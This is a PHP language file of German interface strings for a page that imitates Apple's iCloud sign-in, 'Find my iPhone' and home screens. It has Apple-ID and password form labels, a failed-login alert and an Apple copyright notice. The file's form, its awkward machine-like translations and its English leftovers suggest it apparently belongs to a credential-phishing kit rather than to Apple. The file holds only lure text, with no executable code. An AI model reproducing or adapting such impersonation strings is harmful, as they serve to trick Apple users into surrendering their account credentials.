<?php
/*
------------------
Language: deutsch
------------------
*/
 
$lang = array();
// Header
$lang['PAGE_TITLE'] = 'iCloud';
$lang['SETUP_INSTRUCTIONS'] = 'Anleitung zum Einrichten';
// login form
$lang['SIGN_IN_TITLE'] = 'Bei iCloud anmelden';
$lang['INCORRECT_ID'] = 'Ihre Apple ID oder Ihr Passwort war falsch.';
$lang['APPLE_ID'] = 'Apple-ID';
$lang['PASSWORD'] = 'Passwort';
$lang['KEEP_ME'] = 'Angemeldet bleiben';
$lang['FORGOT_ID'] = 'Apple-ID oder Passwort vergessen?';
$lang['DONT_HAVE_ID'] = 'Sie haben noch keine Apple-ID? ';
$lang['CREATE_YOURS'] = 'Jetzt erstellen';
// Footer
$lang['CHECK_ACTIVATION'] = 'Status der Aktivierungssperre';
$lang['SYSTEM_STATUS'] = 'Systemstatus';
$lang['POLICY'] = 'Datenschutz';
$lang['TERMS'] = 'Nutzungsbedingungen';
$lang['COPYRIGHT'] = 'Copyright © 2017 Apple Inc. Alle Rechte vorbehalten.';
// mobile version language
$lang['MOB_PAGE_TITLE'] = 'iCloud';
$lang['MOB_FIND'] = 'Mein iPhone suchen';
$lang['MOB_APPLE_ID'] = 'Apple-ID';
$lang['MOB_EXAMPLE'] = 'Email';
$lang['MOB_PASSWORD'] = 'Passwort';
$lang['MOB_REQUIRED'] = 'Erforderlich';
$lang['MOB_LOGIN'] = 'Anmelden...';
$lang['MOB_FORGOT_ID'] = 'Apple-ID/Passwort vergessen?';
$lang['MOB_SETUP_INSTRUCTIONS'] = 'Konfigurationsanweisungen';
$lang['MOB_locating'] = 'Suchen ...';
$lang['IDPWD_ERROR_ALERT1'] = 'Verification Failed';
$lang['IDPWD_ERROR_ALERT2'] = 'Your Apple ID or password was incorrect.';
$lang['IDPWD_ERROR_ALERT3'] = 'OK';
// Home Page
$lang['REMINDERS'] = 'Erinnerungen';
$lang['NOTES'] = 'Notizen';
$lang['ICLOUD_DRIVE'] = 'icloud Laufwerk';
$lang['PHOTOS'] = 'Fotos.';
$lang['CONTACTS'] = 'Ansprechpartner.';
$lang['MAIL'] = 'Mail';
$lang['SETTINGS'] = 'Einstellungen';
$lang['FIND_MY_IPHONE'] = 'Finde mein iPhone';
$lang['KEYNOTE'] = 'Keynote';
$lang['NUMBERS'] = 'Nummern';
$lang['FIND_FRIENDS'] = 'Freunde finden';
$lang['PAGES'] = 'Seiten';
// Find . php
$lang['ALL_DEVICES'] = 'Alle Geräte';
$lang['ICLOUD_SETTINGS'] = 'icloud Einstellungen';
$lang['SIGN_OUT'] = 'Ausloggen';
$lang['LOCATE'] = 'Lokalisierung ...';
$lang['ALL_DEVICES_OFFLINE'] = 'Alle Geräte Offline';
$lang['NO_LOCO'] = 'Es können keine Standorte angezeigt werden, da alle Geräte offline sind.';
?>